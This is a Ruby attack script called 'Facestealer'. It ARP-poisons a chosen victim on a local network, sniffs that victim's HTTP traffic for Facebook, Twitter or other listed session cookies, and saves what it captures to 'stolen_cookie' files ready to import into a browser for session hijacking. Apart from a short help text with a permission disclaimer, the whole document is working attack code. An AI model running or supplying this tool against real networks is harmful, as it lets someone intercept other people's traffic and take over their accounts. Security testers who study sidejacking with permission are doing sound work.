#!/usr/bin/env ruby
     
    require 'packetfu'
    require '/root/facestealer/arpspoof.rb'
    require '/root/facestealer/bolocookie.rb'
     
    #Print help if specified
    if ARGV[0] =~ /[Hh]elp/ then
      puts "Facestealer v1.2"
      puts ""
      puts "For use only with permission from the owner of equipment residing on the target subnet.  Unauthorized use of this
    script could be construed as unlawful, and result in fines or possible incarceration.  Please check with the local
    network administrator and law before running this script."
      puts ""
      puts "This is a script to test sidejacking potential on local subnets.  The script will attempt to ARP poison a victim
    on the local subnet and then monitor all traffic until one of the specified sets of cookies is found.  It will
    then save these cookies to a file formatted to what I've seen referred to as the \"Netscape\" cookie file format,
    which can be utilized by applications such as Firefox with the Cookie Importer plug-in. Facebook and Twitter are
    loaded as default targets, though alternate sets of cookies can be loaded into the \"bolocookies.txt\" file.
     
    syntax: facestealer {interface} {T|F} {T|F} [victim IP] [router IP]
    Argument 1: Specify the poisoning / listening interface
    Argument 2: Verbose output?
    Argument 3: Do you want to perform Arp Poisoning? (This is left as an option to give you the opportunity to handle
                traffic monitoring on your own if so desired)
    Argument 4: Specify the victim IP address (Only needed if Arp Poisoning)
    Argument 5: Specify the router IP address (Only needed if Arp Poisoning)
     
     
    Requirements: You must have the packetfu and pcaprub ruby gems installed.  This can be done with the following commands:
     
    gem install packetfu [--user-install]
    gem install pcaprub [--user-install]
     
    The user install option seems to be required if using Back Track 5, as there seem to be path issues with where gems
    are installed and where gems are sought in this distribution.
     
    This script has only been tested with ruby 1.9.2.
     
           "
      exit(0)
    end
     
    #get active interface
    begin
      PacketFu::Utils.whoami?(:iface=>ARGV[0])
    rescue Exception => e
      puts "Invalid interface or improper permissions, try being root"
      exit(1)
    end
    interface = ARGV[0]
     
     
    #verbose output?
    if ARGV[1] =~ /[tT]/ then
      @verbose = true
    end
     
     
    #get whether or not to enable Arp Poisoning
    if ARGV[2] =~ /[Tt]/ then
      poison = true
    end
     
     
    #gather target IP for arpspoofing
    if poison then
      if ARGV[3] =~ /^(\d{1,3}\.){3}\d{1,3}$/ then
        vic_ip = ARGV[3]
      else
        puts "Invalid Victim IP"
        exit(1)
      end
    end
     
     
    #gather router IP for arpspoofing
    if poison then
      if ARGV[4] =~ /^(\d{1,3}\.){3}\d{1,3}$/ then
        route_ip = ARGV[4]
      else
        puts "Invalid Router IP"
        exit(1)
      end
    end
     
     
     
     
    #define a method for outputting verbose info when desired
    def puts_verbose(text)
      if @verbose then
        puts text
      end
    end
     
    puts_verbose("Verbose ON")
     
     
     
     
     
    ###########################################################################
     
     
     
    #Open bolocookie.txt file to read all of the possible sessions to steal
    bolos = Array.new
    count = 0
     
    begin
      File.open("/root/facestealer/bolocookie.txt", "r") do |file|
        while (line = file.gets)
          line = line.chomp
          name = line.slice!(/[^:]*/)
          name.slice!(":")
          bolos << BoloCookie.new(name)
          while cookie = line.slice!(/:[^:]*/) do
            cookie.slice!(":")
            bolos[count].add_cookie(cookie)
          end
          puts "New target definition: #{name}"
          count += 1
        end
      end
    rescue Exception => e
      puts "Error reading bolocookie.txt, this is where the target definitions are found"
      exit(1)
    end
     
     
    ############################################################################
     
     
     
    #call function to start spoofing if control is desired
    if poison then
      Arpspoof.forward(true)
     
     
      #Create arspoof instance
      arp_spoof = Arpspoof.new(route_ip,vic_ip,interface)
     
      #start new arpspoofing thread to run in "parallel" with rest of program
      arp_thread = Thread.new do
        puts_verbose("Calling spoof")
        arp_spoof.spoof
      end
    end
     
     
     
     
    ############################################################################
     
     
     
     
    #Creates a capture object with the following options, and begins capturing in the background
    #<PacketFu::Capture:0xOBJECT_NUM @array=[], @stream=#<Pcap:0xOBJECT_NUM>, @iface="eth0", @snaplen=65535, @promisc=true, @timeout=1>
    cap = PacketFu::Capture.new(:iface => interface, :start => true, :promisc => true,
                                :filter => "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)")
     
    puts "Starting capture on interface: #{interface}"
     
     
    begin
     
      #stream.each returns a raw string of each packet captured.  Note, PacketFu::Packet.parse(packet) will
      #return a packet subclass such as PacketFu::ARPPacket, PacketFu::TCPPacket or PacketFu::ICMPPacket for
      #further manipulation
      cap.stream.each { |packet|
     
        if packet =~ /ookie/
     
        puts_verbose(packet)
     
        bolos.each { |bolo_search|
         
          search_terms = bolo_search.get_cookies
     
          puts_verbose("Search terms:")
          puts_verbose(search_terms)
     
          #search packet for a cookie
          while term = search_terms.pop do
     
            puts_verbose("Searching for: #{term}")
     
     
            if packet =~ /#{term}/
              puts_verbose("found")
     
              #save value for cookie
              value = packet[/#{term}=[^;]*/]
     
              if value.nil? then
                puts_verbose("False positive")
                break
              end
     
              value.slice!(/#{term}=/)
              puts_verbose("Saving value: #{value}")  
     
              #assign cookie value to BoloCookie object hash
              bolo_search.add_value(term,value)
              bolo_search.found(true)
              puts_verbose("#{term}=>#{value}")
     
            else
              puts_verbose("not found")
     
              #if one of the required field is not found, set cookie to not found
              bolo_search.found(false)
              break
     
            end
     
          end
           
          if bolo_search.found? then
     
            #if a BoloCookie is found, opens a new or exsting file (to be overwritten) and saves the hash table in a
            #format acceptable by cookie importer
            user = File.open("stolen_cookie_#{vic_ip}_#{bolo_search.service}.txt", "w")
            puts "File opened: #{user.path}"
            bolo_search.get_pairs.each { |key,value|
              user.puts "#{bolo_search.service}\tTRUE\t/\tFALSE\t0\t#{key}\t#{value}"
            }
            user.close
          end
     
        }
     
        end
     
      }  
     
     
     
    # ^C to stop sniffing
    rescue Interrupt
      puts "\nPacket Capture stopped by interrupt signal."
      if poison then
        arp_spoof.stop
        Arpspoof.forward(false)
        sleep 5
      end
      exit 0
     
    rescue Exception => e
      puts "\nERROR: #{e}"
      if poison then
        arp_spoof.stop
        Arpspoof.forward(false)
        sleep 5
      end
      exit 0
     
    end